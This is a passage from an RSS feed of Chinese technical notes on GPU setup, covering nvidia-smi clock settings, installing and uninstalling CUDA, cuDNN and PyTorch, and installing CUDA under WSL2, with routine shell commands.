<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ac</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3003,1531</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>超频： nvidia-smi-i(显卡号） -ac（你想要的显存频率数字），（你想要的核心频率数字）</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-ac,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --applications-clocks=MEM_CLOCK,GRAPHICS_CLOCK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">将最大[内存、图形]时钟指定为一对（例如</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2000,800）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">它定义了在</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 上运行应用程序时</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GPU™的速度。为</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">来自</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Kepler+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 系列的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Tesla</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设备和基于</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Maxwell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GeForce</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Titan。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">需要</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root，除非使用</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -acp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命令放宽了限制。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Torch部署</title>
      <link>https://www.geekery.cn/note-book/AI-Training/Torch%E9%83%A8%E7%BD%B2.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/Torch%E9%83%A8%E7%BD%B2.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Torch部署</source>
      <description>Torch部署 安装Anaconda 推荐直接上官网下载 https://www.anaconda.com/products/individua 安装CUDA和cuDNN 安装显卡驱动 首先需要下载和安装显卡驱动，进入下面网址选择合适的显卡驱动下载并按照提示安装。如果已安装此处略过。 https://www.nvidia.cn/geforce/driv...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h1>安装Anaconda</h1>
<p>推荐直接上官网下载
<a href="https://www.anaconda.com/products/individual" target="_blank" rel="noopener noreferrer">https://www.anaconda.com/products/individua</a></p>
<h1>安装CUDA和cuDNN</h1>
<h2>安装显卡驱动</h2>
<p>首先需要下载和安装显卡驱动，进入下面网址选择合适的显卡驱动下载并按照提示安装。如果已安装此处略过。
<a href="https://www.nvidia.cn/geforce/drivers/" target="_blank" rel="noopener noreferrer">https://www.nvidia.cn/geforce/drivers/</a></p>
<h2>下载CUDA</h2>
<p>CUDA下载网站
<a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener noreferrer">https://developer.nvidia.com/cuda-toolkit-archive</a></p>
<p>覆盖安装</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./cuda</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --override</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>不选择重装驱动</strong></p>
<p></p>
<h2>下载cuDNN</h2>
<p>cuDNN网址
<a href="https://developer.nvidia.com/cuDnn" target="_blank" rel="noopener noreferrer">https://developer.nvidia.com/cuDnn</a></p>
<p>下载cuDNN需要注册NVIDIA账号并登录，注册时安装官网提示填写用户名、密码、邮箱等，其中需要邮箱验证。</p>
<p><strong>邮箱验证时使用QQ邮箱接收不到验证邮件，使用163邮箱可以。</strong></p>
<h1>安装Torch</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  torch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torchvision</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torchaudio</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --extra-index-url</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://download.pytorch.org/whl/cu116</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://pypi.douban.com/simple</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h1>pytorch：测试GPU是否可用</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torch</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">flag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torch.cuda.is_available</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">flag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ngpu</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> 1</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Decide which device we want to run on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> torch.device</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"cuda:0"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (torch.cuda.is_available() </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ngpu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> "cpu"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">device</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">torch.cuda.get_device_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">torch.rand</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3,3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">.cuda</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">())</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">True</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cuda:0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">GeForce</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> GTX</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1080</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tensor([[0.9530,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.4746,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0.9819],</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        [0.7192, 0.9427, 0.6768]</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        [0.8594, 0.9490, 0.6551]], </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">device</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'cuda:0'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1>完全卸载CUDA</h1>
<blockquote>
<p><a href="https://docs.nvidia.com/cuda/cuda-installation-guide-linux/" target="_blank" rel="noopener noreferrer">https://docs.nvidia.com/cuda/cuda-installation-guide-linux/</a></p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --purge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> remove</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*cublas*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*cufft*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*curand*"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*cusolver*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*cusparse*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*npp*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "*nvjpeg*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "cuda*"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "nsight*"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>在命令行中卸载</p>
<p>注意把下边的xx.x替换为自己的cuda版本。
cuda10.0及以下的卸载：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/cuda-xx.x/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./uninstall_cuda_xx.x.pl</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/cuda-xx.x</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>cuda10.1及以上的卸载：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/cuda-xx.x/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ./cuda-uninstaller</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/cuda-xx.x</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后边加了一句sudo rm -rf /usr/local/cuda-xx.x，这是因为一般情况下cuda都配置了cudnn，在运行卸载程序时只会卸载cuda而不会一并删除cudnn的文件。因为cudnn文件还在的缘故，自己的cuda-xx.x文件夹仍然在，需要手动删除。
所以如果自己要卸载的cuda没有配置cudnn，那么cuda-xx.x文件夹在卸载完成后会被自动删除，也就没必要再运行最后一句了。</p>
<h1>问题</h1>
<h2>setup.py install is deprecated</h2>
<p>解决方法——降档使用setuptools</p>
<p>不过，别担心，有个折中的处理方式。</p>
<p>换一个setuptools版本，选择与ROS2一起工作不产生任何warning的版本。</p>
<p>能满足这个条件的setuptools版本中，最新的是58.2.0。</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#回退安装指令</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">pip install setuptools</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">58.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>如何查询setuptools的版本</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#在python3环境中，执行以下代码</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> setuptools</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(setuptools.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">__version__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Windows的WSL2安装cuda驱动</title>
      <link>https://www.geekery.cn/note-book/AI-Training/Windows%E7%9A%84WSL2%E5%AE%89%E8%A3%85cuda%E9%A9%B1%E5%8A%A8.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/Windows%E7%9A%84WSL2%E5%AE%89%E8%A3%85cuda%E9%A9%B1%E5%8A%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows的WSL2安装cuda驱动</source>
      <description>Windows的WSL2安装cuda驱动 部分资料来自： https://www.bilibili.com/read/cv14608547/ 感谢作者： https://space.bilibili.com/157323585 安装WSL2 这一步可以参考Windows官网，以及其他B站UP主的安装教程，贴两个链接（一定要装WSL2）。 image-2...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>部分资料来自： https://www.bilibili.com/read/cv14608547/</p>
<p>感谢作者： https://space.bilibili.com/157323585</p>
</blockquote>
<h2>安装WSL2</h2>
<p>这一步可以参考Windows官网，以及其他B站UP主的安装教程，贴两个链接（一定要装WSL2）。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://learn.microsoft.com/zh-cn/windows/wsl/install</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h2>安装Windows的nvidia驱动（Windows下操作）</h2>
<p>下载并安装带有WSL2驱动的nvidia-Windows驱动</p>
<p>根据自己电脑显卡类型，分GeForce和QUADRO两个版本，自己电脑是哪个就选哪个。下载驱动后，安装。（安装过程中可以直接选择“精简”模式）</p>
<p><strong>注意！</strong></p>
<p><strong>有人会问：不是安装WSL2的驱动吗？为什么装Windows的？实际上，官网文档上标注 了，带有WSL2的官方nvidia驱动是整个过程唯一要装的GPU驱动！！！千万别被其他指南带错路了！（我就是没找到这个，白白浪费很多时间）</strong></p>
<h2>检测是否安装成功</h2>
<p>cmd命令行输入：</p>
<p>nvidia-smi</p>
<p>如果出现类似于下图效果，即安装完成。</p>
<p></p>
<p>记下图中的CUDA version</p>
<h2>在WSL２中安装CUDA（WSL２中操作）</h2>
<p>参考CUDA官网，选择自己对应的版本。</p>
<p></p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">https://developer.nvidia.com/cuda-downloads</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这里的cuda版本，要比刚才cmd中标注的CUDA version要低。</p>
<p>比如我的CUDA　version是11.6，我在下载CUDA驱动时，可以安装最新的11.5版本。</p>
<p><strong>一定要选择标注的WSL版本！！！</strong></p>
<p></p>
<p>选择完版本后，下面会有整个安装提示，在WSL２中按照方法来就行，如：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://developer.download.nvidia.com/compute/cuda/12.3.2/local_installers/cuda_12.3.2_545.23.08_linux.runsudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sh</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cuda_12.3.2_545.23.08_linux.run</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>安装相关依赖库</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> freeglut3-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build-essential</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libx11-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libxmu-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libxi-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libgl1-mesa-glx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libglu1-mesa</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libglu1-mesa-dev</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在Ubuntu上配置CUDA的环境变量，命令行输入：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在末尾添加（注意：将地址里面的11.5换成自己安装的版本！）：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">local</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">cuda-11</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:+:</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">PATH</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> LD_LIBRARY_PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">local</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">cuda-11</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">lib64</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">LD_LIBRARY_PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:+:</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">LD_LIBRARY_PATH</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF">}}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>更新文件：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span></code></pre>
